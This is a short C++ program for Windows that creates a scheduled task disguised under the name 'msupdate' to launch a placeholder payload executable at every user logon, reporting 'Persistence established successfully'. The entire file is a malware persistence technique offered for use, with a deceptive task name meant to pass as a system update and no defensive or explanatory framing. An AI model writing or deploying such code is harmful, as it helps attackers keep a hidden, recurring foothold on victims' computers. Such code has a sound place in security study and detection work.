// Author: Nemuel Wainaina

#include <iostream>
#include <windows.h>

int main() {
    const wchar_t* taskName = L"msupdate";
    const wchar_t* payload = L"Path\\To\\Your\\Payload.exe";
    wchar_t command[512];

    swprintf(command,
            L"schtasks /create /tn '%s' /tr '%s' /sc onlogon", taskName, payload);
    int result = _wsystem(command);
    if (result != 0) {
        std::cerr << "Persistence failed" << std::endl;
        return 1;
    } else {
        std::cout << "Persistence established successfully" << std::endl;
    }

    return 0;
}
